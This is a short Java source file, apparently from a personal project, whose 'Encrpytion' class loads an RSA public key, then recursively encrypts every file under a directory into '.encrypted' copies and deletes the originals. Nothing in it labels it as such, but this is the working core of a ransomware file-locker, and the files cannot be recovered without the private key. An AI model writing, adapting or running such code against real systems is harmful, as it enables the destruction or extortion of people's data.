/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.mycompany.decode;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.spec.X509EncodedKeySpec;
import javax.crypto.Cipher;
/**
 *
 * @author VanAnh
 */
public class Encrpytion {
     private PublicKey publicKey;

    public void loadPublicKey(String publicKeyFilePath) throws Exception {
        byte[] keyBytes = Files.readAllBytes(Paths.get(publicKeyFilePath));
        X509EncodedKeySpec spec = new X509EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        this.publicKey = keyFactory.generatePublic(spec);
    }

    public void encryptFile(File inputFile, File outputFile) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA");
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);

        try (FileInputStream fis = new FileInputStream(inputFile);
             FileOutputStream fos = new FileOutputStream(outputFile)) {
            byte[] buffer = new byte[245];
            int len;
            while ((len = fis.read(buffer)) > 0) {
                byte[] encrypted = cipher.doFinal(buffer, 0, len);
                fos.write(encrypted);
            }
        }
    }

    public void encryptDirectory(File directory) throws Exception {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    File encryptedFile = new File(file.getAbsolutePath() + ".encrypted");
                    encryptFile(file, encryptedFile);
                    file.delete();
                } else if (file.isDirectory()) {
                    encryptDirectory(file);
                }
            }
        }
    }
}
